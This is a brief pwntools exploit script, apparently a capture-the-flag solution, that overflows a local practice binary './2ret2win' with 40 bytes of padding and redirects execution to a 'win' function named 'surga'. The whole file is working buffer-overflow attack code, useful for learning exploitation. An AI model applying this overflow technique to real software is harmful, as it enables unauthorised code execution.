from pwn import *
p=process("./2ret2win")
e=ELF("./2ret2win")
pay=b"A"*40 #padding
pay+=p64(e.sym.surga) #win function
p.sendline(pay)
p.interactive()